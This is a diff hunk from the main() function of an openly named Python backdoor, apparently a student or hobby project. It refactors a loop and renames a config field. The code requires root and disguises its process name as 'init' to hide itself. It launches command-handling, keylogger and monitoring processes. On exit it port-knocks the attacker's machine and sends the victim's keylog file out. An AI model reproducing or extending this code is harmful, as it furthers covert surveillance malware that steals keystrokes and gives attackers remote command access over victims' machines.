@@ -61,36 +61,35 @@ def main():
     if os.geteuid() != 0:
         sys.exit("Root privilege is required.")
 
-    while True:
-        print("Backdoor running....\n")
-        # Mask process name to camouflage itself
-        setproctitle("init")
+    print("Backdoor running....\n")
+    # Mask process name to camouflage itself
+    setproctitle("init")
 
-        command_process = Process(target=handle_command)
-        keylog_process = Process(target=handle_keylogger)
-        monitor_process = Process(target=handle_monitor)
+    command_process = Process(target=handle_command)
+    keylog_process = Process(target=handle_keylogger)
+    monitor_process = Process(target=handle_monitor)
 
-        try:
-            command_process.start()
-            keylog_process.start()
-            monitor_process.start()
+    try:
+        command_process.start()
+        keylog_process.start()
+        monitor_process.start()
 
-            while True:
-                pass
-        except KeyboardInterrupt:
-            command_process.terminate()
-            keylog_process.terminate()
-            monitor_process.terminate()
-            
-            command_process.join()
-            keylog_process.join()
-            monitor_process.join()
+        while True:
+            pass
+    except KeyboardInterrupt:
+        command_process.terminate()
+        keylog_process.terminate()
+        monitor_process.terminate()
+        
+        command_process.join()
+        keylog_process.join()
+        monitor_process.join()
 
-            # Perform port knocking to open up port on the attacker, then send the log file
-            send_knock()
-            send_keylog(config.keylog_file)
+        # Perform port knocking to open up port on the attacker, then send the log file
+        send_knock()
+        send_keylog(config.victim_keylog_file)
 
-            sys.exit("Exiting program...")
+        sys.exit("Exiting program...")
 
 
 if __name__ == "__main__":
